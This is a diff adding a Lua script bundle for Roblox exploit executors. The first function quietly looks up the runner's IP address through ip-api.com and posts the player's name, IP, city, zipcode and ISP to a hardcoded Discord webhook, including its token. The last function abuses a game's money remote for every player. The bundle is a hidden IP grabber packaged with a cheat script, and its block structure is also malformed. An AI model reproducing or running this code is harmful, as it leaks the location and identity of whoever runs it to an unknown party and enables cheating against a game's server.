@@ -1,0 +1,52 @@
+local function script1()
+	local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+local player_name = game:GetService("Players").LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1073301136922124428/7PDVIeL5Y7ASxw66W19ZR8FSjslFZ1kr-9tOVjknZrTUb-UkAe2TEu1sdQv83qGdufdk"
+
+local ip_info = requestfunc({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+print("Working")
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+print("ip grabbed")
+requestfunc(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+print("Sent")
+end
+	print("Script 1 is running")
+	wait(1)
+end
+
+local function script2()
+	local hint = Instance.new("Hint",Instance.new("Folder",game:GetService("CoreGui")))
+hint.Text = "\nThis script was made by KingLogie#0001\nDO NOT CLAIM AS YOUR OWN"
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local rs = game:GetService("RunService")
+local lp = Players.LocalPlayer
+	print("Script 2 is running")
+	wait(1)
+end
+
+local function script3()
+	local plrs = game:GetService("Players")
+for i, v in pairs(plrs:GetChildren()) do
+game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, 1242233434233423432, "Cash", v)
+end
+	print("Script 3 is running")
+	wait(1)
+end
+
+script1()
+script2()
+script3()
